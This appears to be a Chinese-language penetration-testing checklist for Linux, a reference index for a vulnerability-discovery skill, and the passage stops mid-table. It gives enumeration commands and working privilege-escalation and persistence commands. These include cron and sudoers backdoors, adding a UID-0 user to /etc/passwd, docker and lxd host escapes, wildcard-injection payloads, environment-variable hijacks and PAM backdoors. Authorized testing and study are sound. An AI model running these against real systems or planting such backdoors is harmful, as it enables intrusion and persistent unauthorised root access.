# Linux 系统漏洞挖掘与渗透测试 — 测试点清单（参考索引）

> **文档定位**：本文档是测试思路的参考索引，供在渗透测试过程中查阅和扩展测试方向使用。
> **使用方式**：SKILL.md v3.0 的阶段二已内嵌全部 337 项测试点并要求逐类逐项覆盖。本文档提供更详细的技术细节和扩展思路，当 SKILL.md 中的测试点需要深入分析时按需查阅。
> **关联 Skill**：linux-vuln-discovery v3.0 信号驱动 + 全量测试覆盖框架
> 
> 本文档基于全部参考手册，系统提取 Linux 渗透测试与漏洞挖掘中的关键测试点，按测试流程分章节组织。
> 
> **共 9 大类、60+ 子类、337 项测试点**

---

## 一、信息收集与环境枚举

### 1.1 系统基础信息收集

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 获取内核版本、架构 | `uname -a`、`uname -r`、`arch` |
| 获取系统版本 | `cat /etc/os-release`、`cat /etc/issue` |
| 获取主机名 | `hostname`、`cat /etc/hostname` |
| 获取系统运行时间 | `uptime` |
| 获取环境变量 | `env`、`printenv`、`cat /proc/1/environ` |
| PATH 变量检查 | `echo $PATH`（检查是否含 `.` 或可写目录） |

### 1.2 用户与权限信息收集

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 当前用户身份 | `id`、`whoami`、`groups` |
| 列出系统所有用户 | `cat /etc/passwd` |
| 查找 UID=0 用户 | `cat /etc/passwd \| awk -F: '$3==0'` |
| 查找可登录用户 | `cat /etc/passwd \| grep -v nologin \| grep -v false` |
| 检查空口令用户 | `cat /etc/shadow \| awk -F: '$2==""'` |
| 检查 sudo 权限 | `sudo -l` |
| 检查 /etc/sudoers | `cat /etc/sudoers` |
| 最后登录记录 | `last`、`lastlog` |

### 1.3 网络信息收集

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 网络接口信息 | `ip a`、`ifconfig` |
| 路由表 | `ip route`、`route -n` |
| ARP 表 | `arp -a` |
| DNS 配置 | `cat /etc/resolv.conf`、`cat /etc/hosts` |
| 监听端口 | `ss -tlnp`、`netstat -tlnp` |
| 已建立连接 | `netstat -tnp` |
| 防火墙规则 | `iptables -S`、`iptables -L -n -v` |
| SSH 配置信息 | `cat /etc/ssh/sshd_config` |

### 1.4 进程与服务信息收集

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 所有进程列表 | `ps auxf` |
| 进程树 | `pstree` |
| 查看 cron 定时任务 | `crontab -l`、`cat /etc/crontab`、`ls /etc/cron.*` |
| 查看自启动服务 | `systemctl list-unit-files --type=service` |
| 查看运行中服务 | `systemctl --type=service --state=running` |

### 1.5 文件系统信息收集

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 挂载信息 | `mount`、`findmnt` |
| 查找 SUID/SGID 文件 | `find / -perm -4000 -o -perm -2000` |
| 查找全局可写目录 | `find / -type d -perm -0002` |
| 查找全局可写文件 | `find / -type f -perm -0002` |
| 查找无属主文件 | `find / -nouser -o -nogroup` |
| 查找隐藏可执行文件 | `find / -type f -name "\.*" -perm /+x` |
| 查找近期修改的文件 | `find / -mtime -7` |
| 查找敏感配置文件 | `find / -name "*.conf" -o -name "*.cfg" -o -name "*.env"` |
| 查找备份文件 | `find / -name "*.bak" -o -name "*.old" -o -name "*.backup"` |
| 查找 SSH 密钥文件 | `find / -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys"` |

### 1.6 软件与应用信息收集

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 已安装软件包 | `rpm -qa`、`dpkg -l` |
| 查找可写目录 | `find / -writable -type d` |
| 用户命令历史 | `cat ~/.bash_history`、`cat ~/.mysql_history` |
| 数据库配置文件 | 查找含 password 关键词的配置文件 |
| Web 应用配置 | 查找 nginx/apache/tomcat 配置 |

---

## 二、身份鉴别与认证安全测试

### 2.1 PAM 后门检测

| 测试点 | 关键命令/方法 |
|--------|--------------|
| PAM 模块完整性检查 | `rpm -V pam`、`dpkg -V libpam-modules` |
| PAM 模块哈希对比 | 比较可疑系统与干净基线的 .so 文件哈希 |
| PAM 模块权限检查 | 检查 `/lib/security/` 或 `/lib/x86_64-linux-gnu/security/` 权限 |
| 非标准 PAM 模块检测 | 查找不属于任何包的模块 |
| 未打补丁的 PAM 模块 | `find /lib/security/ -newer /lib/security/pam_permit.so` |
| 审计 PAM 相关文件访问 | 在 `auditd` 规则中监控 `/lib/security/` |
| PAM 完整后门检测链 | 完整的 9 步检测流程 |

### 2.2 PAM 配置漏洞审计

| 测试点 | 关键命令/方法 |
|--------|--------------|
| `pam_unix.so` 有效性 | 是否存在有效的 `pam_unix.so` 认证行 |
| `sufficient` 控制标志误用 | 是否错误使用 `sufficient` 绕过后续认证 |
| 账户锁定策略 | 是否配置 `pam_faillock.so` 或 `pam_tally2.so` |
| PAM 配置文件权限 | 是否为 644（非更宽松权限） |
| `nullok` 参数检测 | 是否存在 `nullok` 允许空口令 |
| `debug` 参数检测 | 是否存在 `debug` 信息泄露风险 |
| `nullok` 空口令认证 | `pam_unix.so` 是否配置 `nullok` |

### 2.3 pam_exec 滥用检测

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 查找 pam_exec.so 配置 | `grep -rn pam_exec.so /etc/pam.d/ /etc/pam.conf` |
| 脚本文件权限检查 | 是否有 777 权限或非 root 属主 |
| 脚本内容审计 | 是否对输入进行安全过滤 |

### 2.4 authselect 持久化检测

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 自定义 Profile 检查 | `ls /etc/authselect/custom/` |
| Profile 完整性 | `authselect apply-changes` |

### 2.5 自定义 PAM 模块逆向分析

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 硬编码凭据检查 | `strings`、`r2`、`ghidra` 分析 .so |
| 认证逻辑绕过 | 逆向分析认证流程 |
| 输入过滤与命令注入 | `system()`、`popen()` 调用 |
| 弱加密或硬编码密钥 | 查找加密相关符号 |

### 2.6 Kerberos 票据利用

| 测试点 | 关键命令/方法 |
|--------|--------------|
| KRB5CCNAME 票据文件 | `env \| grep KRB5CCNAME`、`find / -name "*.ccache"` |
| 内核密钥环票据 | `keyctl show`、`keyctl search keyring persistent @u` |
| SSSD KCM 守护进程 | 套接字 `/var/run/.heim_org.h5l.kcm-socket` |
| keytab 密钥表文件 | `find / -name "*.keytab"`、`klist -kt` |

### 2.7 SSH Agent 转发劫持

| 测试点 | 关键命令/方法 |
|--------|--------------|
| SSH_AUTH_SOCK 检测 | `ls -la $SSH_AUTH_SOCK` |
| Agent 转发劫持 | `SSH_AUTH_SOCK=/tmp/ssh-xxx/agent.xxx ssh-add -l` |

---

## 三、服务与软件漏洞利用

### 3.1 数据库服务

| 测试点 | 关键命令/方法 |
|--------|--------------|
| **MySQL/MariaDB** UDF 提权 | `mysql -u root -p` → 写 UDF .so |
| **Redis** 未授权/弱口令 | `redis-cli -h <IP> -a <pass>` |
| **Redis** 写 SSH 公钥/定时任务 | `config set dir /root/.ssh`、`config set dbfilename authorized_keys` |
| **PostgreSQL** 命令执行 | `COPY ... FROM PROGRAM` |

### 3.2 容器与编排服务

| 测试点 | 关键命令/方法 |
|--------|--------------|
| **Docker Daemon** 暴露 | `curl -s http://localhost:2375/info` |
| Docker Socket 可访问 | `ls -la /var/run/docker.sock` |
| **Kubernetes Kubelet** 暴露 | `curl -sk https://localhost:10250/pods` |

### 3.3 本地提权服务

| 测试点 | 关键命令/方法 |
|--------|--------------|
| **Sudo** 漏洞利用 | `sudo -l` → GTFOBins |
| **Polkit** 提权 | `pkexec --version` → CVE-2021-4034 |
| **Systemd** 利用 | 检查 `systemd-run` 权限 |

### 3.4 网络服务

| 测试点 | 关键命令/方法 |
|--------|--------------|
| **NFS** 提权 | `showmount -e <IP>`、`no_root_squash` |
| **Squid** 代理利用 | 内网穿透 |
| **SMTP** 枚举用户 | `VRFY`、`EXPN` 命令 |
| **SSH** 弱口令/密钥 | 暴力破解、弱密钥 |
| **Samba** 漏洞利用 | 空口令、共享目录 |

### 3.5 Web 服务

| 测试点 | 关键命令/方法 |
|--------|--------------|
| **Apache** 提权 | 日志注入、mod_cgi |
| **Nginx** 提权 | 配置错误 |
| **Tomcat** 漏洞 | 爆破 Manager、PUT 上传、反序列化 |

---

## 四、本地权限提升

### 4.1 Linux Capabilities 提权

| 测试点 | 滥用方式 |
|--------|---------|
| CAP_SYS_ADMIN | mount 文件系统、逃逸容器 |
| CAP_DAC_READ_SEARCH | 绕过文件权限读取任意文件 |
| CAP_DAC_OVERRIDE | 覆写任意文件 |
| CAP_SETUID/GID | 修改进程 UID/GID |
| CAP_SETFCAP | 设置文件 capabilities |
| CAP_SYS_PTRACE | 附加到高权限进程注入代码 |
| CAP_SYS_RAWIO | 直接读写 I/O 端口 |
| CAP_KILL | 向任意进程发送信号 |
| CAP_NET_ADMIN/RAW | 网络配置修改、ARP 欺骗 |
| CAP_MKNOD | 创建设备文件 |
| Capabilities 组合链 | 多个低权限 capability 组合提权 |

### 4.2 SUID 提权

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 查找 SUID 文件 | `find / -perm -4000 -type f` |
| 22+ 种已知 SUID 命令利用 | bash、python、find、vim、nmap 等 |
| 自定义 SUID 程序后门 | 编译包含 `setuid(0)` 的程序 |

### 4.3 动态链接器劫持

| 测试点 | 关键命令/方法 |
|--------|--------------|
| RPATH/RUNPATH 注入 | `readelf -d <binary> \| grep -E 'RPATH\|RUNPATH'` |
| SUID 程序 .so 注入 | 伪造同名共享库 |
| LD_PRELOAD 劫持 | 检查 `/etc/ld.so.preload` |
| ld.so.conf 错误配置 | 检查 `/etc/ld.so.conf.d/` 中非特权用户可写的路径 |

### 4.4 Sudo 提权

| 测试点 | 关键命令/方法 |
|--------|--------------|
| sudo -l 配置审计 | 查看允许执行的命令 |
| GTFOBins 利用 | 参考 gtfobins.github.io |
| sudo 缓存利用 | sudo timestamp 操纵 |
| 脚本参数注入 | 用户可控参数注入命令 |
| sudoedit CVE-2023-22809 | sudoedit 绕过 |
| env_keep 环境变量注入 | `LD_PRELOAD`、`LD_LIBRARY_PATH` |

### 4.5 特殊用户组提权

> 详细利用原理见 `reference/04-本地权限提升与配置缺陷.md` §五

| 组名 | 测试点 | 详细利用命令 |
|------|--------|-------------|
| **shadow** | 读取 /etc/shadow | `cat /etc/shadow` → 提取哈希 → `john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt` 或 `hashcat -m 1800 shadow.txt wordlist.txt`（SHA-512）|
| | 密码复用验证 | `echo 'root:$6$xxx:...' > /tmp/shadow; john /tmp/shadow` → 破解后 `sshpass -p 'cracked' ssh root@localhost` |
| **disk** | 直接读块设备 | `debugfs /dev/sda1` → `cat /etc/shadow` |
| | 提取敏感文件 | `dd if=/dev/sda1 bs=512 skip=$(( $(stat -c %s /etc/shadow)/512 )) count=1 2>/dev/null` |
| **video** | 读取帧缓冲 | `cat /dev/fb0 > /tmp/screen.raw` → `ffmpeg -f rawvideo -pix_fmt bgra -s 1920x1080 -i /tmp/screen.raw /tmp/screen.png` |
| | 屏幕截图工具 | `import -window root /tmp/screenshot.png`（如已安装 ImageMagick） |
| **root** | 直接 root 权限 | `id` 确认 `gid=0(root)` → 可读写 root 拥有的任何文件 |
| | 修改 /etc/passwd | `echo 'hacker:$6$xxx:0:0::/root:/bin/bash' >> /etc/passwd` |
| **docker** | 宿主机 root shell | `docker run -v /:/host --rm -it alpine chroot /host bash` |
| | 只读挂载读取密钥 | `docker run -v /home:/host:ro --rm -it alpine cat /host/.ssh/id_rsa` |
| | Docker Socket 逃逸 | `docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host bash` |
| **lxc/lxd** | 初始化并逃逸 | `lxd init`（默认参数）→ `lxc image import alpine.tar.gz alpine` → `lxc init alpine c -c security.privileged=true` → `lxc config device add c host-root disk source=/ path=/mnt/root` → `lxc start c` → `lxc exec c bash` |
| | 快捷方式 | `lxc launch ubuntu:22.04 c -c security.privileged=true -c raw.idmap="both 0 0"` |
| **staff** | 写入 /usr/local | 检查 `ls -la /usr/local/bin/` → 放置恶意脚本等待 root 执行 |
| **adm** | 读取系统日志 | `cat /var/log/syslog`、`cat /var/log/auth.log` → 搜索密码/敏感信息 |

### 4.6 文件系统与配置缺陷提权

> 详细利用原理见 `reference/04-本地权限提升与配置缺陷.md` §六

#### 4.6.1 任意文件写入利用

| 测试点 | 详细命令 |
|--------|---------|
| 查找可写文件（root 拥有） | `find / -writable -user root -type f 2>/dev/null` |
| 查找可写目录（root 拥有） | `find / -writable -user root -type d 2>/dev/null` |
| 写入 cron 后门 | `echo '* * * * * root chmod +s /bin/bash' > /etc/cron.d/backdoor` |
| 写入 sudoers | `echo 'current_user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/evil` |
| 写入 SSH 公钥 | `echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys` |
| 写入 systemd 服务 | 写入 `/etc/systemd/system/backdoor.service` 配置 `ExecStart=/bin/bash -c 'chmod +s /bin/bash'` |

#### 4.6.2 NFS no_root_squash 提权

| 测试点 | 详细命令 |
|--------|---------|
| 枚举 NFS 共享 | `showmount -e TARGET_IP` |
| 检查 no_root_squash | `cat /var/lib/nfs/etab \| grep no_root_squash` 或远程 `showmount -a TARGET` |
| 挂载并利用 | `mount -o vers=3 TARGET:/share /mnt` → `cp /bin/bash /mnt/rootbash` → `chmod +s /mnt/rootbash` → `ssh USER@TARGET '/mnt/rootbash -p'` |

#### 4.6.3 符号链接攻击

| 测试点 | 详细命令 |
|--------|---------|
| 检查 root 进程跟随符号链接 | `ps aux \| grep root` → 识别写文件的 root 进程 |
| 创建符号链接 | `ln -sf /etc/passwd /tmp/userdata` → 等待 root 进程写入 → 检查 `cat /etc/passwd` |
| 日志文件符号链接 | `ln -sf /etc/cron.d/evil /tmp/app.log` → 等待日志写入生成 cron 任务 |

#### 4.6.4 通配符注入

| 测试点 | 详细命令 |
|--------|---------|
| tar --checkpoint 注入 | `cd /target_dir; echo '--checkpoint=1' > --checkpoint=1; echo '--checkpoint-action=exec=id' > --checkpoint-action=exec=id; tar cf /dev/null *` |
| chown 注入 | `echo 'hacker ALL=(ALL) NOPASSWD: ALL' > --reference=/etc/sudoers; chown -R hacker *` |
| chmod 注入 | `echo '4755' > -R; chmod *`（使文件变 SUID） |
| rsync 注入 | `echo '-e sh -c id' > -e sh -c id; rsync *` |

#### 4.6.5 其他文件系统缺陷

| 测试点 | 详细命令 |
|--------|---------|
| 挂载选项检查 | `mount \| grep -v nosuid`、`findmnt -o TARGET,OPTIONS \| grep -v nosuid` |
| 敏感备份文件 | `find / -name "*.bak" -o -name "*.old" -o -name "*.save" -o -name "*.backup" -o -name "*~" 2>/dev/null` |
| 配置文件密码 | `grep -rli 'password\|passwd\|pass=' /etc/ /opt/ /var/www/ 2>/dev/null` |
| 隐藏可执行文件 | `find / -type f -name ".*" -perm /+x 2>/dev/null` |
| 启动链可写检查 | `ls -la /etc/init.d/ /etc/rc.local /etc/systemd/system/` → 检查可写脚本 |
| 可写套接字 | `find / -type s -writable 2>/dev/null` → 尝试向 socket 注入命令 |

### 4.7 计划任务提权

> 详细利用原理见 `reference/04-本地权限提升与配置缺陷.md` §七、`reference/08-权限维持与后渗透持久化.md` §三

| 测试点 | 详细命令 |
|--------|---------|
| **Cron 任务枚举** | `crontab -l`、`cat /etc/crontab`、`ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/` |
| **系统 cron 审计** | `for f in /etc/cron.d/*; do echo "=== $f ==="; cat "$f"; done` |
| **Cron 脚本可写性** | `crontab -l \| awk '{print $NF}' \| xargs ls -la 2>/dev/null` → 检查脚本是否 `writable` |
| | `cat /etc/crontab \| grep -v '^#' \| awk '{print $NF}' \| xargs ls -la 2>/dev/null` |
| **Cron 路径劫持** | 检查 cron 中 `PATH=` 是否含可写目录 → 在可写目录放置同名恶意脚本 |
| **通配符注入** | 脚本中含 `tar *` → 创建 `--checkpoint=1` 和 `--checkpoint-action=exec=id` 文件 |
| **Cron 竞态条件** | 脚本以 root 身份操作可写目录中的文件 → 符号链接替换 |
| **anacron 检查** | `cat /etc/anacrontab` → 检查脚本可写性 |
| **at 任务检查** | `atq` → 查看待执行任务 |
| **Systemd 定时器** | `systemctl list-timers --all` → 检查 timer unit 对应 service 的 ExecStart 路径可写性 |

### 4.8 环境变量与路径劫持

> 详细利用原理见 `reference/04-本地权限提升与配置缺陷.md` §八、`reference/01-linux基础与信息收集.md` 环境变量攻击性章节

| 测试点 | 详细命令 |
|--------|---------|
| **PATH 劫持** | `echo $PATH` → 检查是否含 `.` 或可写目录 → `echo '#!/bin/bash\nchmod +s /bin/bash' > /writable_dir/common_cmd; chmod +x /writable_dir/common_cmd` |
| **LD_PRELOAD 劫持** | `cat /etc/ld.so.preload` → 如用户可写则写入恶意 .so 路径 |
| | 检查 `env \| grep LD_PRELOAD` → sudo 程序是否保留 LD_PRELOAD（`sudo -V \| grep 'LD_PRELOAD'`） |
| **LD_LIBRARY_PATH 劫持** | `echo $LD_LIBRARY_PATH` → 在可写路径放置同名 .so → 检查 `readelf -d <binary> \| grep NEEDED` |
| **PYTHONPATH 劫持** | `python3 -c 'import sys; print(sys.path)'` → 在优先路径放置恶意模块 |
| **PERL5OPT 注入** | `echo $PERL5OPT` → `export PERL5OPT='-e system("/bin/bash")'` → 执行 perl 脚本 |
| **NODE_OPTIONS** | `export NODE_OPTIONS="--require=/tmp/evil.js"` → 执行 node 程序 |
| **RUBYLIB** | `export RUBYLIB="/tmp/evil_gem"` → 执行 ruby 程序 |

### 4.9 受限环境逃逸

> 详细利用原理见 `reference/04-本地权限提升与配置缺陷.md` §九、`reference/05-运行时注入与劫持.md` §二

| 环境 | 逃逸命令 |
|------|---------|
| **chroot 逃逸** | `python3 -c "import os; os.chdir('/'); os.system('/bin/bash')"` |
| | `mkdir /tmp/chroot_bak; cd /tmp; chroot . /bin/bash` → 利用未解除的文件描述符 |
| **rbash 逃逸** | `bash -p`（如 bash 在 PATH 中） |
| | `vi -c ':!bash'` 或 `vi -c ':set shell=/bin/bash' -c ':shell'` |
| | `python3 -c "import pty; pty.spawn('/bin/bash')"` |
| | `awk 'BEGIN {system("/bin/bash")}'` |
| | `man -P '/bin/bash' man`（less 中按 `!bash`） |
| | `nmap --interactive` → `!sh`（旧版 nmap） |
| **Python 监牢** | `import os; os.system('/bin/sh')` |
| | `import subprocess; subprocess.call(['/bin/bash'])` |
| | `import pty; pty.spawn('/bin/bash')` |
| **Lua 监牢** | `os.execute('/bin/sh')` |
| | `io.popen('/bin/sh'):read('*a')` |
| **vi/vim 逃逸** | `:!/bin/bash`、`:set shell=/bin/bash`、`:shell` |
| **less/more 逃逸** | `!bash`（在 less 中输入） |
| **FTP/SFTP 逃逸** | `!bash`（在 FTP 提示符中输入） |
| **screen 逃逸** | `screen -D -R`（分离并重新连接） |
| **TMUX 逃逸** | `tmux new -s evil`（创建新 session） |

### 4.10 SELinux / ACL 安全测试

> 详细利用原理见 `reference/04-本地权限提升与配置缺陷.md` §十、§十一

| 测试点 | 详细命令 |
|--------|---------|
| **SELinux 状态** | `getenforce`（Enforcing/Permissive/Disabled）、`sestatus` |
| **SELinux 当前上下文** | `id -Z`、`ps auxZ \| grep root` |
| **策略类型** | `sestatus \| grep 'Policy type'`（targeted/minimum/MLS） |
| **策略规则查询** | `semanage -l`（列出所有策略）、`sesearch --allow -s httpd_t -t shadow_t` |
| **SELinux 布尔值** | `getsebool -a \| grep 'on$'` → 寻找可利用的宽松布尔值 |
| | `setsebool -P httpd_can_network_connect on`（如需要） |
| **unconfined_t 域** | `ps auxZ \| grep unconfined_t` → 检查是否有进程在不受限域中运行 |
| **SELinux 通配符绕过** | 利用 `*` 通配符的策略漏洞（CVE-相关） |
| **ACL 漏洞** | `getfacl -R /etc/sudoers /etc/shadow /root/ 2>/dev/null` |
| | `getfacl -R /home/*/` → 检查过度宽松的 ACL |
| | `find / -acl -type f 2>/dev/null` → 查找所有设置了 ACL 的文件 |
| | `getfacl /path/to/file` → 检查 `user::rwx` 或 `other::rwx` |
| **AppArmor 状态** | `aa-status`、`cat /proc/self/attr/current` |
| | 检查 AppArmor 配置文件：`ls /etc/apparmor.d/` → 寻找 `complain` 模式的配置 |

### 4.11 网络攻击面分析

> 详细利用原理见 `reference/04-本地权限提升与配置缺陷.md` §十二、`reference/01-linux基础与信息收集.md` §六

| 测试点 | 详细命令 |
|--------|---------|
| **本地监听服务** | `ss -tlnp`（TCP）、`ss -ulnp`（UDP） |
| | `ss -tlnp \| grep '127.0.0.1'` → 仅本地监听的服务（可能存在未授权访问） |
| | `ss -tlnp \| awk '{print $4}' \| sort -u` → 去重列出所有监听地址:端口 |
| **外部连接** | `ss -tnp` → 查看已建立的外部连接 |
| | `ss -tnp \| grep ESTAB \| awk '{print $5}' \| cut -d: -f1 \| sort -u` → 去重外部 IP |
| **防火墙规则** | `iptables -S`、`iptables -L -n -v`、`iptables -t nat -L -n -v` |
| | `nft list ruleset`（nftables）、`firewall-cmd --list-all`（firewalld） |
| **本地服务利用** | `curl http://127.0.0.1:PORT` → 探测本地 Web 服务 |
| | `curl http://127.0.0.1:PORT/actuator` → Spring Boot Actuator |
| | `curl http://127.0.0.1:PORT/server-status` → Apache Server Status |
| | `curl http://127.0.0.1:PORT/nginx_status` → Nginx Status |
| **Docker API** | `curl -s http://127.0.0.1:2375/info` → Docker API 未授权 |
| | `curl -s --unix-socket /var/run/docker.sock http://localhost/info` |
| **数据库端口** | `ss -tlnp \| grep -E '3306|5432|6379|27017|9200'` → MySQL/PostgreSQL/Redis/MongoDB/Elasticsearch |
| **DNS 枚举** | `cat /etc/resolv.conf` → 获取 DNS 服务器 → `nslookup`、`dig` 子域名枚举 |
| **ARP 信息** | `arp -a` → 识别同网段其他主机 |
| **路由信息** | `ip route`、`route -n` → 识别可达网段 |
| **网络嗅探** | `tcpdump -i eth0 -c 100 -w /tmp/capture.pcap` → 捕获明文凭据 |

---

## 五、运行时注入与代码调试利用

### 5.1 Shellshock 漏洞利用

| 测试点 | 关键命令/方法 |
|--------|--------------|
| Shellshock (CVE-2014-6271) | CGI、SSH ForceCommand、Cron 等攻击面 |

### 5.2 Python 代码注入与调试利用

| 测试点 | 关键命令/方法 |
|--------|--------------|
| Pdb 调试器注入 | `breakpoint()`、`import pdb; pdb.set_trace()` |
| Python 模块劫持 | site-packages 注入、`.pth` 文件利用 |
| .egg/.zip 代码执行 | 伪造 Python 包文件 |
| Python 字节码操纵 | 修改 `.pyc` 文件 |
| 导入路径修改 | `PYTHONPATH`、`sys.path` |
| sitecustomize.py 劫持 | 放置恶意 `sitecustomize.py` |
| Werkzeug/Django 调试 | 寻找 Debug PIN |
| 远程调试利用 | pyrasite、GDB attach |

### 5.3 Ruby 调试利用

| 测试点 | 关键命令/方法 |
|--------|--------------|
| byebug/debug 调试器 | 检查是否存在调试入口 |
| Ruby GC 漏洞利用 | dirty cow、反序列化利用 |

### 5.4 浏览器调试端口利用

| 测试点 | 关键命令/方法 |
|--------|--------------|
| Chrome/Chromium 远程调试 | `--remote-debugging-port=9222` |
| Firefox 调试端口 | `--remote-debugging-port` |
| Selenium/WebDriver RCE | CVE-2021-38112 |

### 5.5 Node.js 调试/注入利用

| 测试点 | 关键命令/方法 |
|--------|--------------|
| Node.js inspect 调试 | `--inspect`、`--inspect-brk` |
| VM2 RCE | CVE-2023-37466、CVE-2023-37903 |

### 5.6 Java 调试与反序列化利用

| 测试点 | 关键命令/方法 |
|--------|--------------|
| JDWP 远程调试利用 | `jdb -connect` |
| JNDI 注入（Log4Shell） | `jndi:ldap://`、`jndi:rmi://` |
| JMX 利用 | MLet 加载远程恶意 MBean |
| RMI 利用 | 反序列化、远程类加载 |
| Tomcat 管理台 | jmx-console、web-console、MainDeployer |
| Tomcat PUT 上传 | CVE-2025-24813 |

### 5.7 C/C++ 调试利用

| 测试点 | 关键命令/方法 |
|--------|--------------|
| GDB attach 注入 | `gdb -p <PID>` |
| gdbserver 远程代码执行 | `gdbserver` 暴露的利用 |

### 5.8 PHP 调试利用

| 测试点 | 关键命令/方法 |
|--------|--------------|
| Xdebug RCE | `XDEBUG_SESSION_START` → 反向连接 |

### 5.9 进程注入与内存操纵

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 共享库注入（DDexec/MemExec） | 内存执行技术绕过只读/不可执行保护 |
| LD_PRELOAD 注入 | `/etc/ld.so.preload` |
| /proc/pid/mem 写入 | 直接修改进程内存 |
| GDB attach 注入 | 附加到高权限进程 |
| strace/ltrace 信息泄露 | 监控系统调用和库函数 |
| 进程内存转储 | `gcore`、`/proc/pid/mem` |
| GOT/PLT 表钩子 | 劫持全局偏移表 |

### 5.10 Shell 命令混淆

| 测试点 | 关键命令/方法 |
|--------|--------------|
| Bashfuscator | 命令混淆绕过 WAF/IDS |
| 双重 Base64 编码 | 绕过输入过滤 |
| `${IFS}` 替换空格 | 绕过空格过滤 |
| Glob 通配符绕过 | `/???/??t /???/p??s??` |

---

## 六、本地 IPC 通信安全

### 6.1 Unix 域套接字安全测试

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 套接字发现与枚举 | `ss -xlnp`、`lsof -U` |
| 套接字权限检查 | `ls -la /var/run/*.sock /tmp/*.sock` |
| Socket 命令注入 | `os.system(datagram)` → 注入系统命令 |
| Root 特权套接字信号触发提权 | 利用 TID + 信号触发特权代码路径 |

### 6.2 D-Bus 总线安全测试

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 总线枚举（系统/会话） | `busctl list` |
| GUI 枚举工具 | D-Feet |
| 命令行枚举 | `busctl list`、`gdbus`、`dbus-send` |
| 自动化枚举 | `dbusmap --dump-methods`、`uptux.py` |
| 服务对象深度分析 | `busctl status/tree/introspect` |
| D-Bus XML 策略分析 | `/etc/dbus-1/system.d/` |
| Polkit 操作分析 | `/usr/share/polkit-1/actions/` |
| 三层关联分析 | 激活元数据 + D-Bus 策略 + Polkit |
| D-Bus 命令注入提权 | 通过 D-Bus 方法调用注入命令 |
| D-Bus 通信监控 | `busctl monitor`、`dbus-monitor` |
| 流量捕获 | `busctl capture` → pcapng |
| 已知 CVE | CVE-2024-45752、CVE-2025-23222 |

### 6.3 扩展属性（xattr）安全测试

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 扩展属性枚举 | `getfattr -d -m ".*" <file>` |
| 安全相关属性 | `security.capability`、`security.selinux` |
| 敏感信息泄露 | `user.*` 命名空间存储敏感数据 |
| 完整性检查绕过 | 扩展属性隐藏恶意数据 |

---

## 七、容器与虚拟化逃逸

### 7.1 容器环境识别

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 容器标记文件 | `ls -la /.dockerenv` |
| cgroup 信息 | `cat /proc/1/cgroup` |
| PID 1 进程 | `readlink /proc/1/exe` |
| 容器运行时识别 | Docker/Containerd/Podman/LXC |
| 编排平台识别 | Kubernetes/Swarm/OpenShift |
| 基础镜像类型 | 标准发行版/Alpine/无发行版/Scratch |

### 7.2 容器保护机制分析

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 命名空间分析 | `readlink /proc/self/ns/{mnt,pid,net,user}` |
| Capabilities 分析 | `capsh --print`、`grep Cap /proc/self/status` |
| Seccomp 分析 | `grep Seccomp /proc/self/status` |
| AppArmor/SELinux | `cat /proc/self/attr/current` |
| cgroup 资源控制 | `cat /sys/fs/cgroup/memory.max` |
| 用户命名空间映射 | `cat /proc/self/uid_map` |

### 7.3 容器逃逸技术

| 测试点 | 逃逸方式 |
|--------|---------|
| 特权容器逃逸 | `--privileged` → mount 宿主机磁盘 |
| Docker Socket 利用 | 挂载 docker.sock → 创建特权容器 |
| Docker Daemon API 利用 | 未授权访问 Docker API |
| containerd 逃逸 | 利用 containerd API |
| runc 运行时逃逸 | CVE-2019-5736 等 |
| LXC/LXD 逃逸 | `lxd` 组提权 |
| cgroup 逃逸 | cgroup notify_on_release |
| 挂载逃逸 | 宿主机根目录挂载、可写 bind 挂载 |
| 命名空间逃逸 | hostPID、hostNetwork |
| 无发行版容器渗透 | 脚本语言反弹 shell、内存执行 |

### 7.4 Kubernetes 安全测试

| 测试点 | 关键命令/方法 |
|--------|--------------|
| Service Account Token | `/var/run/secrets/kubernetes.io/serviceaccount/` |
| Kubelet API 利用 | `curl -sk https://localhost:10250/pods` |
| API Server 利用 | RBAC 绕过、权限提升 |
| etcd 数据泄露 | 读取 etcd 获取所有 Secret |
| kubeconfig 文件 | `find / -name "kubeconfig" -o -path "*/.kube/config"` |

### 7.5 镜像安全与供应链

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 镜像漏洞扫描 | `trivy image`、`grype dir:/` |
| 镜像层分析 | `docker history`、`dive` |
| 密钥与秘密泄露 | 搜索镜像中的凭据 |
| Dockerfile 审计 | `COPY` 密钥文件、`ENV` 硬编码密码 |

### 7.6 容器枚举工具

| 工具 | 用途 |
|------|------|
| linpeas | Linux 通用提权枚举 |
| CDK | 容器专用渗透工具 |
| amicontained | 快速容器限制识别 |
| deepce | Docker 专用枚举 |
| trivy / grype | 漏洞扫描 |

---

## 八、权限维持与后渗透持久化

### 8.1 SUID 后门

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 复制系统二进制并设 SUID | `cp /bin/bash /tmp/.hidden && chmod 6755` |
| 编译自定义 SUID 程序 | `setuid(0); system("/bin/bash")` |

### 8.2 PAM 后门

| 测试点 | 关键命令/方法 |
|--------|--------------|
| pam_permit.so 万能密码 | 在 `/etc/pam.d/sshd` 添加 `auth sufficient pam_permit.so` |
| pam_exec 密码记录 | 记录所有登录密码到日志 |
| 编译自定义 pam_unix.so | 硬编码后门密码 |

### 8.3 共享库注入持久化

| 测试点 | 关键命令/方法 |
|--------|--------------|
